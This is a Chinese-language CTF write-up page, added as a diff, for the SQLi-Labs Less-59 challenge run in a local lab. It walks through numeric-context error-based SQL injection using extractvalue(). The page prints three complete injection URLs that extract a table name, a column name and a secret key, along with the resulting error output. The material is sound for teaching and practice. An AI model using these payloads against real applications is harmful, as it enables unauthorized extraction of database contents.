@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-59 Challenge-6 纯数字型报错注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-59 Challenge-6 纯数字型报错注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 报错注入, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-59 (Challenge-6)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库中提取密钥，限制 5 次尝试。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡延续了 L58 的报错注入机制（因联合查询无回显）。</p>
+    <p><strong>核心区别：</strong>上下文环境为<b>纯数字型</b>，无需使用单引号闭合。直接在参数后使用 <code>and</code> 拼接报错函数即可触发。受限于 <code>extractvalue</code> 的 32 字符截断限制，需分步提取。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：获取随机表名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1 and extractvalue(1,concat(0x7e,(select concat(table_name,0x3a,column_name) from information_schema.columns where table_schema='challenges' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~t6kqd2v5ee:id'</code>。提取出当前随机表名 <code>t6kqd2v5ee</code>。</p>
+
+    <p><strong>第二步：精准获取密钥列名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='challenges' and table_name='t6kqd2v5ee' and column_name like 'secret%' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~secret_CA8I'</code>。精准定位到目标列名。</p>
+
+    <p><strong>第三步：提取 24 位密钥（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1 and extractvalue(1,concat(0x7e,(select secret_CA8I from challenges.t6kqd2v5ee)))</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~<24位随机密钥>'</code>。</p>
+    <p>将密钥提交至页面底部的 <code>Submit Secret Key</code> 框内，完成通关。</p>
+
+    <h2>4. 策略复盘</h2>
+    <ul>
+        <li><strong>上下文判定：</strong>Challenge 关卡中，进入关卡后首先需测试单引号或括号是否报错，以此判断是字符型还是数字型。本关为纯数字型，直接拼接即可。</li>
+        <li><strong>分步提取：</strong>受限于 32 字符的回显限制，将表名、列名、密钥分三次提取，是保证数据完整性的最佳实践。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>纯数字型报错注入</strong>：无需闭合，直接利用逻辑运算符连接报错函数。</li>
+        <li><strong>信息聚合限制</strong>：在特定回显长度限制下，利用精确过滤（<code>LIKE</code>、<code>LIMIT</code>）分步提取目标数据。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
